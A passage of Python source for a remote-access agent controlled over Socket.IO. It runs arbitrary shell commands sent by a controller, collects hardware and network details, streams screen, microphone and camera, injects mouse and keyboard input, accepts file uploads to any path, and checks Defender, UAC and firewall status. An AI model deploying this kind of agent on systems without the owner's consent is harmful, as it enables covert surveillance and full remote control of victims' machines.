                            s = str(v.get('output','')).strip()
                        else:
                            s = str(v).strip()
                        i1 = s.find('{')
                        i2 = s.find('[')
                        idx = i1 if (i1>=0 and (i1<=i2 or i2<0)) else i2
                        if idx is not None and idx >= 0:
                            s = s[idx:]
                        return _json.loads(s)
                    except Exception:
                        return None
                hw = {}
                cpu_raw = execute_command("powershell -Command \"Get-CimInstance Win32_Processor | Select Name, NumberOfCores, NumberOfLogicalProcessors, MaxClockSpeed, Manufacturer | ConvertTo-Json\"")
                cpu_json = _parse(cpu_raw)
                cpu_obj = cpu_json[0] if isinstance(cpu_json, list) and cpu_json else (cpu_json or {})
                hw['cpu'] = {
                    'name': str(cpu_obj.get('Name') or ''),
                    'cores': int(cpu_obj.get('NumberOfCores') or 0),
                    'threads': int(cpu_obj.get('NumberOfLogicalProcessors') or 0),
                    'frequency': int(cpu_obj.get('MaxClockSpeed') or 0),
                    'architecture': platform.machine(),
                    'vendor': str(cpu_obj.get('Manufacturer') or '')
                }
                mem_mod_raw = execute_command("powershell -Command \"Get-CimInstance Win32_PhysicalMemory | Select Manufacturer, Capacity, Speed | ConvertTo-Json\"")
                mem_mod_json = _parse(mem_mod_raw) or []
                modules = []
                if isinstance(mem_mod_json, list):
                    for m in mem_mod_json:
                        cap = m.get('Capacity')
                        try:
                            cap_int = int(cap)
                        except Exception:
                            try:
                                cap_int = int(float(cap))
                            except Exception:
                                cap_int = 0
                        spd = m.get('Speed')
                        try:
                            spd_int = int(spd)
                        except Exception:
                            try:
                                spd_int = int(float(spd))
                            except Exception:
                                spd_int = 0
                        modules.append({
                            'manufacturer': str(m.get('Manufacturer') or ''),
                            'capacity': cap_int,
                            'speed': spd_int
                        })
                mem_total = 0
                mem_available = 0
                mem_used = 0
                mem_speed = 0
                try:
                    import psutil as _ps
                    vm = _ps.virtual_memory()
                    mem_total = int(getattr(vm, 'total', 0) or 0)
                    mem_available = int(getattr(vm, 'available', 0) or 0)
                    mem_used = int(getattr(vm, 'used', 0) or 0)
                except Exception:
                    pass
                if mem_total == 0:
                    s_raw = execute_command("powershell -Command \"Get-CimInstance Win32_ComputerSystem | Select TotalPhysicalMemory | ConvertTo-Json\"")
                    s_json = _parse(s_raw)
                    if isinstance(s_json, list) and s_json:
                        try:
                            mem_total = int(s_json[0].get('TotalPhysicalMemory') or 0)
                        except Exception:
                            mem_total = 0
                    elif isinstance(s_json, dict):
                        try:
                            mem_total = int(s_json.get('TotalPhysicalMemory') or 0)
                        except Exception:
                            mem_total = 0
                    mem_available = 0
                    mem_used = 0
                if modules:
                    try:
                        mem_speed = int(round(sum([m.get('speed',0) for m in modules if isinstance(m.get('speed',0), (int,float))]) / max(1, len(modules))))
                    except Exception:
                        mem_speed = 0
                hw['memory'] = {
                    'total': mem_total,
                    'available': mem_available,
                    'used': mem_used,
                    'type': 'DDR' if modules else '',
                    'speed': mem_speed,
                    'modules': modules
                }
                disk_raw = execute_command("powershell -Command \"Get-CimInstance Win32_DiskDrive | Select Model, Size, InterfaceType, MediaType | ConvertTo-Json\"")
                disk_json = _parse(disk_raw) or []
                storage = []
                if isinstance(disk_json, list):
                    for d in disk_json:
                        sz = d.get('Size')
                        try:
                            sz_int = int(sz)
                        except Exception:
                            try:
                                sz_int = int(float(sz))
                            except Exception:
                                sz_int = 0
                        storage.append({
                            'name': str(d.get('Model') or ''),
                            'size': sz_int,
                            'type': str(d.get('MediaType') or ''),
                            'interface': str(d.get('InterfaceType') or ''),
                            'health': 'Good'
                        })
                hw['storage'] = storage
                gpu_raw = execute_command("powershell -Command \"Get-CimInstance Win32_VideoController | Select Name, AdapterRAM, DriverVersion, VideoProcessor | ConvertTo-Json\"")
                gpu_json = _parse(gpu_raw) or []
                gpus = []
                if isinstance(gpu_json, list):
                    for g in gpu_json:
                        ram = g.get('AdapterRAM')
                        try:
                            ram_int = int(ram)
                        except Exception:
                            try:
                                ram_int = int(float(ram))
                            except Exception:
                                ram_int = 0
                        gpus.append({
                            'name': str(g.get('Name') or ''),
                            'memory': ram_int,
                            'driver': str(g.get('DriverVersion') or ''),
                            'vendor': str(g.get('VideoProcessor') or '')
                        })
                hw['gpu'] = gpus
                net_raw = execute_command("powershell -Command \"Get-CimInstance Win32_NetworkAdapterConfiguration | Where-Object {$_.IPEnabled -eq $true} | Select Description, MACAddress, IPAddress | ConvertTo-Json\"")
                net_json = _parse(net_raw) or []
                nets = []
                if isinstance(net_json, list):
                    for n in net_json:
                        ip = n.get('IPAddress')
                        if isinstance(ip, list) and ip:
                            ip_str = str(ip[0])
                        else:
                            ip_str = str(ip or '')
                        nets.append({
                            'name': str(n.get('Description') or ''),
                            'mac': str(n.get('MACAddress') or ''),
                            'ip': ip_str,
                            'type': 'Ethernet' if 'Ethernet' in str(n.get('Description') or '') else 'Network'
                        })
                hw['network'] = nets
                mb_raw = execute_command("powershell -Command \"Get-CimInstance Win32_BaseBoard | Select Manufacturer, Product | ConvertTo-Json\"")
                mb_json = _parse(mb_raw)
                bios_raw = execute_command("powershell -Command \"Get-CimInstance Win32_BIOS | Select SMBIOSBIOSVersion | ConvertTo-Json\"")
                bios_json = _parse(bios_raw)
                mb = {}
                if isinstance(mb_json, list) and mb_json:
                    mb['manufacturer'] = str(mb_json[0].get('Manufacturer') or '')
                    mb['model'] = str(mb_json[0].get('Product') or '')
                elif isinstance(mb_json, dict):
                    mb['manufacturer'] = str(mb_json.get('Manufacturer') or '')
                    mb['model'] = str(mb_json.get('Product') or '')
                if isinstance(bios_json, list) and bios_json:
                    mb['bios'] = str(bios_json[0].get('SMBIOSBIOSVersion') or '')
                elif isinstance(bios_json, dict):
                    mb['bios'] = str(bios_json.get('SMBIOSBIOSVersion') or '')
                hw['motherboard'] = mb
                safe_emit('agent_response', {
                    'agent_id': our_agent_id,
                    'agentId': our_agent_id,
                    'type': 'hardware_info',
                    'hardware': hw
                })
                output = ""
                success = True
                return
        except Exception:
            pass
        internal_commands = {
            "start-stream": lambda: start_streaming(our_agent_id),
            "stop-stream": stop_streaming,
            "start-audio": lambda: start_audio_streaming(our_agent_id),
            "stop-audio": stop_audio_streaming,
            "start-camera": lambda: start_camera_streaming(our_agent_id),
            "stop-camera": stop_camera_streaming,
            "screenshot": lambda: "Screenshot captured",
            "systeminfo": lambda: execute_command("systeminfo" if WINDOWS_AVAILABLE else "uname -a"),
        }
        
        # Handle bulk action commands
        if command == "shutdown":
            try:
                output = "Agent shutting down..."
                success = True
                safe_emit('command_result', {
                    'agent_id': our_agent_id,
                    'execution_id': execution_id,
                    'output': output,
                    'success': True,
                    'execution_time': 0
                })
                log_message("[SHUTDOWN] Agent shutdown requested via bulk action")
                time.sleep(1)
                os._exit(0)
            except Exception as e:
                error_msg = f"Error during shutdown: {str(e)}"
                log_message(error_msg, "error")
                output = error_msg
                success = False
        elif command == "restart":
            try:
                output = "Agent restarting..."
                success = True
                safe_emit('command_result', {
                    'agent_id': our_agent_id,
                    'execution_id': execution_id,
                    'output': output,
                    'success': True,
                    'execution_time': 0
                })
                log_message("[RESTART] Agent restart requested via bulk action")
                time.sleep(1)
                if WINDOWS_AVAILABLE:
                    os.execv(sys.executable, [sys.executable] + sys.argv)
                else:
                    os.execv(sys.executable, [sys.executable] + sys.argv)
            except Exception as e:
                error_msg = f"Error during restart: {str(e)}"
                log_message(error_msg, "error")
                output = error_msg
                success = False
        elif command == "collect-logs":
            try:
                logs = []
                if WINDOWS_AVAILABLE:
                    result = execute_command("powershell -Command \"Get-EventLog -LogName System -Newest 100 | Select-Object TimeGenerated, EntryType, Source, Message | ConvertTo-Json\"")
                    logs.append("=== Windows System Event Logs (Last 100) ===")
                    if isinstance(result, dict):
                        logs.append(result.get('output', ''))
                    else:
                        logs.append(str(result))
                else:
                    result = execute_command("tail -n 100 /var/log/syslog")
                    logs.append("=== System Logs (Last 100 lines) ===")
                    if isinstance(result, dict):
                        logs.append(result.get('output', ''))
                    else:
                        logs.append(str(result))
                output = "\n".join(logs)
            except Exception as e:
                output = f"Error collecting logs: {e}"
                success = False
        elif command == "security-scan":
            try:
                scan_results = []
                scan_results.append("=== Security Scan Results ===\n")
                if WINDOWS_AVAILABLE:
                    scan_results.append("1. UAC Status:")
                    result = execute_command("reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA")
                    if isinstance(result, dict):
                        scan_results.append(result.get('output', ''))
                    else:
                        scan_results.append(str(result))
                    scan_results.append("")
                    scan_results.append("2. Windows Defender Status:")
                    result = execute_command("powershell -Command \"Get-MpComputerStatus | Select-Object AntivirusEnabled, RealTimeProtectionEnabled | ConvertTo-Json\"")
                    if isinstance(result, dict):
                        scan_results.append(result.get('output', ''))
                    else:
                        scan_results.append(str(result))
                    scan_results.append("")
                scan_results.append("3. Firewall Status:")
                if WINDOWS_AVAILABLE:
                    result = execute_command("netsh advfirewall show allprofiles state")
                else:
                    result = execute_command("sudo ufw status")
                if isinstance(result, dict):
                    scan_results.append(result.get('output', ''))
                else:
                    scan_results.append(str(result))
                scan_results.append("")
                scan_results.append("4. High-Risk Processes:")
                if WINDOWS_AVAILABLE:
                    result = execute_command("powershell -Command \"Get-Process | Where-Object {$_.CPU -gt 50} | Select-Object ProcessName, CPU, WorkingSet | ConvertTo-Json\"")
                else:
                    result = execute_command("ps aux | awk '{if($3>50.0) print $0}'")
                if isinstance(result, dict):
                    scan_results.append(result.get('output', ''))
                else:
                    scan_results.append(str(result))
                scan_results.append("\n=== Scan Complete ===")
                output = "\n".join(scan_results)
                
                # Emit security notification
                emit_security_notification(
                    'info',
                    'Security Scan Completed',
                    'Security assessment completed successfully'
                )
            except Exception as e:
                output = f"Error running security scan: {e}"
                success = False
                
                # Emit security notification for failure
                emit_security_notification(
                    'error',
                    'Security Scan Failed',
                    f'Security scan failed: {str(e)}'
                )
        elif command == "update-agent":
            output = "Agent update mechanism not yet implemented.\n"
            output += "Future implementation will:\n"
            output += "1. Download latest agent version from controller\n"
            output += "2. Verify signature\n"
            output += "3. Replace current executable\n"
            output += "4. Restart with new version"
        elif command in internal_commands:
            try:
                output = internal_commands[command]()
                if output is None:
                    output = f"Command '{command}' executed successfully"
            except Exception as e:
                output = f"Error executing '{command}': {e}"
                success = False
        elif command.lower().startswith("cd "):
            try:
                path = command[3:].strip()
                os.chdir(path)
                output = f"Changed directory to: {os.getcwd()}"
                success = True
            except Exception as e:
                output = f"cd error: {str(e)}"
                success = False
        else:
            # Execute as system command
            try:
                output = execute_command(command)
                if not output:
                    output = "(command completed with no output)"
            except Exception as e:
                output = f"Command execution error: {e}"
                success = False
        
        # Send output back to controller WITH execution_id
        log_message(f"[EXECUTE_COMMAND] Sending output ({len(output)} chars) with execution_id: {execution_id}")
        # For UI v2.1: Send PowerShell-formatted output
        if isinstance(output, dict) and 'terminal_type' in output:
            # Already formatted by execute_in_powershell
            safe_emit('command_result', {
                'agent_id': our_agent_id,
                'execution_id': execution_id,
                'success': success,
                **output  # Spread PowerShell formatting data
            })
        else:
            # Legacy format
            safe_emit('command_result', {
                'agent_id': our_agent_id,
                'execution_id': execution_id,
                'command': command,
                'output': output,
                'success': success,
                'terminal_type': 'legacy',
                'prompt': get_powershell_prompt(),
                'timestamp': int(time.time() * 1000)
            })
        
        # Emit notification for command execution
        if success:
            emit_command_notification(
                'success',
                'Command Executed',
                f'Command "{command}" executed successfully'
            )
        else:
            emit_command_notification(
                'error',
                'Command Failed',
                f'Command "{command}" failed to execute'
            )
    
        # Start execution in background thread (daemon, won't block)
        execution_thread = threading.Thread(target=execute_in_thread, daemon=True)
        execution_thread.start()
        
        # Return immediately to Socket.IO (don't block!)
        
    

def on_bulk_action(data):
    try:
        if not isinstance(data, dict):
            return
        action = data.get('action')
        if not action:
            return
        mapping = {
            'shutdown-all': 'shutdown',
            'restart-all': 'restart',
            'start-all-streams': 'start-stream',
            'start-all-audio': 'start-audio',
            'collect-system-info': 'systeminfo',
            'security-scan': 'security-scan',
            'download-logs': 'collect-logs',
            'update-agents': 'update-agent',
        }
        command = mapping.get(action)
        if not command:
            return
        agent_id = get_or_create_agent_id()
        execution_id = f"bulk_{int(time.time() * 1000)}"
        on_execute_command({'agent_id': agent_id, 'command': command, 'execution_id': execution_id})
    except Exception:
        pass

def on_mouse_move(data):
    """Handle simulated mouse movements."""
    try:
        if not SOCKETIO_AVAILABLE or sio is None:
            log_message("Socket.IO not available, cannot handle mouse move", "warning")
            return
        
        x = data.get('x')
        y = data.get('y')
        width = data.get('width')
        height = data.get('height')
        
        # Normalize to screen coordinates if width/height provided
        try:
            nx = float(x)
            ny = float(y)
            if width is not None and height is not None and 0.0 <= nx <= 1.0 and 0.0 <= ny <= 1.0:
                screen_w = None
                screen_h = None
                try:
                    import pyautogui
                    sw, sh = pyautogui.size()
                    screen_w, screen_h = int(sw), int(sh)
                except Exception:
                    try:
                        import ctypes
                        user32 = ctypes.windll.user32
                        screen_w = int(user32.GetSystemMetrics(0))
                        screen_h = int(user32.GetSystemMetrics(1))
                    except Exception:
                        pass
                if screen_w and screen_h:
                    x = int(nx * screen_w)
                    y = int(ny * screen_h)
        except Exception:
            pass
        
        if mouse_controller:
            mouse_controller.position = (x, y)
        elif low_latency_input:
            low_latency_input.handle_input({
                'action': 'mouse_move',
                'data': {'x': x, 'y': y}
            })
    except Exception as e:
        log_message(f"Error simulating mouse move: {e}", "error")
        emit_system_notification('error', 'Remote Control Error', f'Mouse move failed: {str(e)}')

def on_mouse_click(data):
    """Handle simulated mouse clicks."""
    try:
        if not SOCKETIO_AVAILABLE or sio is None:
            log_message("Socket.IO not available, cannot handle mouse click", "warning")
            return
        
        button = data.get('button')
        event_type = data.get('event_type')
        x = data.get('x')
        y = data.get('y')
        width = data.get('width')
        height = data.get('height')
        
        # Move to target position if coordinates provided
        try:
            nx = float(x)
            ny = float(y)
            pos_x = x
            pos_y = y
            if width is not None and height is not None and 0.0 <= nx <= 1.0 and 0.0 <= ny <= 1.0:
                screen_w = None
                screen_h = None
                try:
                    import pyautogui
                    sw, sh = pyautogui.size()
                    screen_w, screen_h = int(sw), int(sh)
                except Exception:
                    try:
                        import ctypes
                        user32 = ctypes.windll.user32
                        screen_w = int(user32.GetSystemMetrics(0))
                        screen_h = int(user32.GetSystemMetrics(1))
                    except Exception:
                        pass
                if screen_w and screen_h:
                    pos_x = int(nx * screen_w)
                    pos_y = int(ny * screen_h)
            if mouse_controller and pos_x is not None and pos_y is not None:
                mouse_controller.position = (pos_x, pos_y)
        except Exception:
            pass

        if mouse_controller:
            try:
                mouse_button = getattr(pynput.mouse.Button, str(button).lower())
            except Exception:
                # Map numeric buttons to names
                btn_map = {0: 'left', 1: 'middle', 2: 'right'}
                name = btn_map.get(int(button) if isinstance(button, (int, float)) else 0, 'left')
                mouse_button = getattr(pynput.mouse.Button, name)
            if event_type == 'down':
                mouse_controller.press(mouse_button)
            elif event_type == 'up':
                mouse_controller.release(mouse_button)
        elif low_latency_input:
            low_latency_input.handle_input({
                'action': 'mouse_click',
                'data': {'button': button, 'pressed': event_type == 'down'}
            })
    except Exception as e:
        log_message(f"Error simulating mouse click: {e}", "error")
        emit_system_notification('error', 'Remote Control Error', f'Mouse click failed: {str(e)}')

def on_remote_key_press(data):
    """Handle simulated key presses from remote controller."""
    try:
        if not SOCKETIO_AVAILABLE or sio is None:
            log_message("Socket.IO not available, cannot handle key press", "warning")
            return
        
        key = data.get('key')
        event_type = data.get('event_type')

        if keyboard_controller:
            if event_type == 'down':
                if key in pynput.keyboard.Key.__members__:
                    key_to_press = getattr(pynput.keyboard.Key, key)
                    keyboard_controller.press(key_to_press)
                else:
                    keyboard_controller.press(key)
            elif event_type == 'up':
                if key in pynput.keyboard.Key.__members__:
                    key_to_release = getattr(pynput.keyboard.Key, key)
                    keyboard_controller.release(key_to_release)
                else:
                    keyboard_controller.release(key)
        elif low_latency_input:
            low_latency_input.handle_input({
                'action': 'key_press',
                'data': {'key': key}
            })
    except Exception as e:
        log_message(f"Error simulating key press: {e}", "error")
        emit_system_notification('error', 'Remote Control Error', f'Key press failed: {str(e)}')

def on_file_upload(data):
    if not SOCKETIO_AVAILABLE or sio is None:
        log_message("Socket.IO not available, cannot handle file upload", "warning")
        return
    """Handle file upload via Socket.IO."""
    try:
        if not data or not isinstance(data, dict):
            safe_emit('file_upload_result', {'success': False, 'error': 'Invalid data format'})
            return
        
        destination_path = data.get('destination_path')
        file_content_b64 = data.get('content')
        
        if not destination_path or not file_content_b64:
            safe_emit('file_upload_result', {'success': False, 'error': 'Missing destination_path or content'})
            return
        
        # Use the existing handle_file_upload function
        result = handle_file_upload(['upload-file', destination_path, file_content_b64])
        
        # Check if upload was successful
        success = not result.startswith('Error:') and not result.startswith('File upload failed:')
        
        safe_emit('file_upload_result', {'success': success, 'result': result})
        
    except Exception as e:
        safe_emit('file_upload_result', {'success': False, 'error': str(e)})

# ========================================================================================
# WEBRTC SIGNALING EVENT HANDLERS FOR LOW-LATENCY STREAMING
# ========================================================================================

def on_webrtc_offer(data):
    if not SOCKETIO_AVAILABLE or sio is None:
        log_message("Socket.IO not available, cannot handle WebRTC offer", "warning")
        return
    """Handle WebRTC offer from controller to start streaming."""
    try:
        agent_id = get_or_create_agent_id()
        offer_sdp = data.get('sdp')
        enable_screen = data.get('enable_screen', True)
        enable_audio = data.get('enable_audio', True)
        enable_camera = data.get('enable_camera', False)
        
        if not offer_sdp:
            safe_emit('webrtc_error', {'agent_id': agent_id, 'error': 'Missing SDP offer'})
            return
        
        log_message(f"Received WebRTC offer for agent {agent_id}")
        
        # Start WebRTC streaming with the received offer
        if AIORTC_AVAILABLE:
            start_webrtc_streaming(agent_id, enable_screen, enable_audio, enable_camera)
            safe_emit('webrtc_offer_accepted', {'agent_id': agent_id})
        else:
            # Fallback to Socket.IO streaming
            log_message("WebRTC not available, falling back to Socket.IO streaming", "warning")
            start_streaming(agent_id)
            safe_emit('webrtc_fallback', {'agent_id': agent_id, 'method': 'socketio'})
            
    except Exception as e:
        error_msg = f"WebRTC offer handling failed: {str(e)}"
        log_message(error_msg, "error")
        safe_emit('webrtc_error', {'agent_id': get_or_create_agent_id(), 'error': error_msg})

def on_webrtc_answer(data):
    if not SOCKETIO_AVAILABLE or sio is None:
        log_message("Socket.IO not available, cannot handle WebRTC answer", "warning")
        return
    """Handle WebRTC answer from controller."""
    try:
        agent_id = data.get('agent_id', get_or_create_agent_id())
        answer_sdp = data.get('sdp')
        
        if not answer_sdp:
            safe_emit('webrtc_error', {'agent_id': agent_id, 'error': 'Missing SDP answer'})
            return
        
        log_message(f"Received WebRTC answer for agent {agent_id}")
        
        if AIORTC_AVAILABLE:
            # Handle the answer asynchronously
            loop = ensure_webrtc_loop(agent_id)
            asyncio.run_coroutine_threadsafe(handle_webrtc_answer(agent_id, answer_sdp), loop)
            safe_emit('webrtc_answer_received', {'agent_id': agent_id})
        else:
            log_message("WebRTC not available, cannot handle answer", "warning")
            
    except Exception as e:
        error_msg = f"WebRTC answer handling failed: {str(e)}"
        log_message(error_msg, "error")
        safe_emit('webrtc_error', {'agent_id': get_or_create_agent_id(), 'error': error_msg})

def on_webrtc_ice_candidate(data):
    if not SOCKETIO_AVAILABLE or sio is None:
        log_message("Socket.IO not available, cannot handle WebRTC ICE candidate", "warning")
        return
    """Handle ICE candidate from controller."""
    try:
        agent_id = data.get('agent_id', get_or_create_agent_id())
        candidate_data = data.get('candidate')
        
        if not candidate_data:
            safe_emit('webrtc_error', {'agent_id': agent_id, 'error': 'Missing ICE candidate data'})
            return
        
        log_message(f"Received ICE candidate for agent {agent_id}")
        
        if AIORTC_AVAILABLE:
            # Handle the ICE candidate asynchronously
            loop = ensure_webrtc_loop(agent_id)
            asyncio.run_coroutine_threadsafe(handle_webrtc_ice_candidate(agent_id, candidate_data), loop)
        else:
            log_message("WebRTC not available, cannot handle ICE candidate", "warning")
            
    except Exception as e:
        error_msg = f"ICE candidate handling failed: {str(e)}"
        log_message(error_msg, "error")
        safe_emit('webrtc_error', {'agent_id': get_or_create_agent_id(), 'error': error_msg})

def on_webrtc_start_streaming(data):
    """Handle request to start WebRTC streaming."""
    try:
        if not SOCKETIO_AVAILABLE or sio is None:
            log_message("Socket.IO not available, cannot handle WebRTC start streaming", "warning")
            emit_system_notification('error', 'WebRTC Error', 'Socket.IO not available')
            return
        
        agent_id = get_or_create_agent_id()
        enable_screen = data.get('enable_screen', True)
        enable_audio = data.get('enable_audio', True)
        enable_camera = data.get('enable_camera', False)
        
        log_message(f"Starting WebRTC streaming for agent {agent_id}")
        
        if AIORTC_AVAILABLE:
            start_webrtc_streaming(agent_id, enable_screen, enable_audio, enable_camera)
            safe_emit('webrtc_streaming_started', {'agent_id': agent_id})
            emit_system_notification('success', 'WebRTC Started', 'WebRTC streaming started successfully')
        else:
            # Fallback to Socket.IO streaming
            log_message("WebRTC not available, falling back to Socket.IO streaming", "warning")
            start_streaming(agent_id)
            safe_emit('webrtc_fallback', {'agent_id': agent_id, 'method': 'socketio'})
            emit_system_notification('warning', 'WebRTC Fallback', 'Using Socket.IO streaming (WebRTC not available)')
            
    except Exception as e:
        error_msg = f"WebRTC streaming start failed: {str(e)}"
        log_message(error_msg, "error")
        emit_system_notification('error', 'WebRTC Failed', f'WebRTC streaming failed: {str(e)}')
        safe_emit('webrtc_error', {'agent_id': get_or_create_agent_id(), 'error': error_msg})

def on_webrtc_stop_streaming(data):
    """Handle request to stop WebRTC streaming."""
    try:
        if not SOCKETIO_AVAILABLE or sio is None:
            log_message("Socket.IO not available, cannot handle WebRTC stop streaming", "warning")
            emit_system_notification('error', 'WebRTC Error', 'Socket.IO not available')
            return
        
        agent_id = data.get('agent_id', get_or_create_agent_id())
        
        log_message(f"Stopping WebRTC streaming for agent {agent_id}")
        
        if AIORTC_AVAILABLE:
            stop_webrtc_streaming(agent_id)
            safe_emit('webrtc_streaming_stopped', {'agent_id': agent_id})
            emit_system_notification('success', 'WebRTC Stopped', 'WebRTC streaming stopped successfully')
        else:
            # Fallback to Socket.IO streaming stop
            stop_streaming()
            safe_emit('webrtc_fallback', {'agent_id': agent_id, 'method': 'socketio'})
            emit_system_notification('info', 'WebRTC Fallback', 'Using Socket.IO streaming (WebRTC not available)')
            
    except Exception as e:
        error_msg = f"WebRTC streaming stop failed: {str(e)}"
        log_message(error_msg, "error")
        emit_system_notification('error', 'WebRTC Failed', f'WebRTC stop failed: {str(e)}')
        safe_emit('webrtc_error', {'agent_id': get_or_create_agent_id(), 'error': error_msg})

def on_webrtc_get_stats(data):
    if not SOCKETIO_AVAILABLE or sio is None:
        log_message("Socket.IO not available, cannot handle WebRTC get stats", "warning")
        return
    """Handle request for WebRTC streaming statistics."""
    try:
        agent_id = data.get('agent_id', get_or_create_agent_id())
        
        if AIORTC_AVAILABLE:
            stats = get_webrtc_stats(agent_id)
            safe_emit('webrtc_stats', {'agent_id': agent_id, 'stats': stats})
        else:
            # Return fallback stats
            fallback_stats = {
                'method': 'socketio',
                'status': 'WebRTC not available',
                'fps': 0,
                'latency': 0,
                'bandwidth': 0
            }
            safe_emit('webrtc_stats', {'agent_id': agent_id, 'stats': fallback_stats})
            
    except Exception as e:
        error_msg = f"WebRTC stats request failed: {str(e)}"
        log_message(error_msg, "error")
        safe_emit('webrtc_error', {'agent_id': get_or_create_agent_id(), 'error': error_msg})

def on_webrtc_set_quality(data):
    if not SOCKETIO_AVAILABLE or sio is None:
        log_message("Socket.IO not available, cannot handle WebRTC set quality", "warning")
        return
    """Handle request to adjust WebRTC streaming quality."""
    try:
        agent_id = data.get('agent_id', get_or_create_agent_id())
        quality = data.get('quality', 85)
        fps = data.get('fps', 30)
        
        log_message(f"Adjusting WebRTC quality for agent {agent_id}: quality={quality}, fps={fps}")
        
        if AIORTC_AVAILABLE and agent_id in WEBRTC_STREAMS:
            # Update quality settings for active streams
            for track in WEBRTC_STREAMS[agent_id].values():
                if hasattr(track, 'set_quality'):
                    track.set_quality(quality)
                if hasattr(track, 'set_fps'):
                    track.set_fps(fps)
            
            safe_emit('webrtc_quality_updated', {'agent_id': agent_id, 'quality': quality, 'fps': fps})
        else:
            log_message("WebRTC streams not available for quality adjustment", "warning")
            
    except Exception as e:
        error_msg = f"WebRTC quality adjustment failed: {str(e)}"
        log_message(error_msg, "error")
        safe_emit('webrtc_error', {'agent_id': get_or_create_agent_id(), 'error': error_msg})

def on_webrtc_quality_change(data):
    if not SOCKETIO_AVAILABLE or sio is None:
        log_message("Socket.IO not available, cannot handle WebRTC quality change", "warning")
        return
    """Handle request to change WebRTC quality level."""
    try:
        agent_id = data.get('agent_id', get_or_create_agent_id())
        quality_level = data.get('quality_level', 'auto')
        
        log_message(f"Changing WebRTC quality level for agent {agent_id}: {quality_level}")
        
        if AIORTC_AVAILABLE and agent_id in WEBRTC_STREAMS:
            # Apply quality level changes
            result = adaptive_bitrate_control(agent_id, quality_level)
            safe_emit('webrtc_quality_changed', {
                'agent_id': agent_id, 
                'quality_level': quality_level,
                'result': result
            })
        else:
            log_message("WebRTC streams not available for quality change", "warning")
            
    except Exception as e:
        error_msg = f"WebRTC quality change failed: {str(e)}"
        log_message(error_msg, "error")
        safe_emit('webrtc_error', {'agent_id': get_or_create_agent_id(), 'error': error_msg})

def on_webrtc_frame_dropping(data):
    if not SOCKETIO_AVAILABLE or sio is None:
        log_message("Socket.IO not available, cannot handle WebRTC frame dropping", "warning")
        return
    """Handle request to implement frame dropping."""
    try:
        agent_id = data.get('agent_id', get_or_create_agent_id())
        load_threshold = data.get('load_threshold', 0.8)
        
        log_message(f"Implementing frame dropping for agent {agent_id} with threshold {load_threshold}")
        
        if AIORTC_AVAILABLE and agent_id in WEBRTC_STREAMS:
            # Implement frame dropping
            result = implement_frame_dropping(agent_id, load_threshold)
            safe_emit('webrtc_frame_dropping_implemented', {
                'agent_id': agent_id,
                'load_threshold': load_threshold,
                'result': result
            })
        else:
            log_message("WebRTC streams not available for frame dropping", "warning")
            
    except Exception as e:
        error_msg = f"WebRTC frame dropping failed: {str(e)}"
        log_message(error_msg, "error")
        safe_emit('webrtc_error', {'agent_id': get_or_create_agent_id(), 'error': error_msg})

def on_webrtc_get_enhanced_stats(data):
    if not SOCKETIO_AVAILABLE or sio is None:
        log_message("Socket.IO not available, cannot handle WebRTC get enhanced stats", "warning")
        return
    """Handle request for enhanced WebRTC statistics."""
    try:
        agent_id = data.get('agent_id', get_or_create_agent_id())
        
        log_message(f"Gathering enhanced WebRTC stats for agent {agent_id}")
        
        if AIORTC_AVAILABLE and agent_id in WEBRTC_STREAMS:
            # Get enhanced monitoring data
            monitoring_data = enhanced_webrtc_monitoring()
            safe_emit('webrtc_enhanced_stats', {
                'agent_id': agent_id,
                'stats': monitoring_data
            })
        else:
            log_message("WebRTC streams not available for enhanced stats", "warning")
            
    except Exception as e:
        error_msg = f"WebRTC enhanced stats failed: {str(e)}"
        log_message(error_msg, "error")
        safe_emit('webrtc_error', {'agent_id': get_or_create_agent_id(), 'error': error_msg})

def on_webrtc_get_production_readiness(data):
    if not SOCKETIO_AVAILABLE or sio is None:
        log_message("Socket.IO not available, cannot handle WebRTC get production readiness", "warning")
        return
    """Handle request for production readiness assessment."""
    try:
        agent_id = data.get('agent_id', get_or_create_agent_id())
        
        log_message(f"Assessing production readiness for agent {agent_id}")
        
        # Get production readiness assessment
        readiness = assess_production_readiness()
        safe_emit('webrtc_production_readiness', {
            'agent_id': agent_id,
            'readiness': readiness
        })
        
    except Exception as e:
        error_msg = f"Production readiness assessment failed: {str(e)}"
        log_message(error_msg, "error")
        safe_emit('webrtc_error', {'agent_id': get_or_create_agent_id(), 'error': error_msg})

def on_webrtc_get_migration_plan(data):
    if not SOCKETIO_AVAILABLE or sio is None:
        log_message("Socket.IO not available, cannot handle WebRTC get migration plan", "warning")
        return
    """Handle request for mediasoup migration plan."""
    try:
        agent_id = data.get('agent_id', get_or_create_agent_id())
        
        log_message(f"Generating mediasoup migration plan for agent {agent_id}")
        
        # Generate migration plan
        migration_plan = generate_mediasoup_migration_plan()
        safe_emit('webrtc_migration_plan', {
            'agent_id': agent_id,
            'plan': migration_plan
        })
        
    except Exception as e:
        error_msg = f"Migration plan generation failed: {str(e)}"
        log_message(error_msg, "error")
        safe_emit('webrtc_error', {'agent_id': get_or_create_agent_id(), 'error': error_msg})

def on_webrtc_get_monitoring_data(data):
    if not SOCKETIO_AVAILABLE or sio is None:
        log_message("Socket.IO not available, cannot handle WebRTC get monitoring data", "warning")
        return
    """Handle request for comprehensive monitoring data."""
    try:
        agent_id = data.get('agent_id', get_or_create_agent_id())
        
        log_message(f"Gathering comprehensive monitoring data for agent {agent_id}")
        
        if AIORTC_AVAILABLE and agent_id in WEBRTC_STREAMS:
            # Get comprehensive monitoring data
            monitoring_data = enhanced_webrtc_monitoring()
            safe_emit('webrtc_monitoring_data', {
                'agent_id': agent_id,
                'data': monitoring_data
            })
        else:
            log_message("WebRTC streams not available for monitoring data", "warning")
            
    except Exception as e:
        error_msg = f"WebRTC monitoring data failed: {str(e)}"
        log_message(error_msg, "error")
        safe_emit('webrtc_error', {'agent_id': get_or_create_agent_id(), 'error': error_msg})

def on_webrtc_adaptive_bitrate_control(data):
    if not SOCKETIO_AVAILABLE or sio is None:
        log_message("Socket.IO not available, cannot handle WebRTC adaptive bitrate control", "warning")
        return
    """Handle request to manually trigger adaptive bitrate control."""
    try:
        agent_id = data.get('agent_id', get_or_create_agent_id())
        current_quality = data.get('current_quality', 'auto')
        
        log_message(f"Manually triggering adaptive bitrate control for agent {agent_id}")
        
        if AIORTC_AVAILABLE and agent_id in WEBRTC_STREAMS:
            # Trigger adaptive bitrate control
            result = adaptive_bitrate_control(agent_id, current_quality)
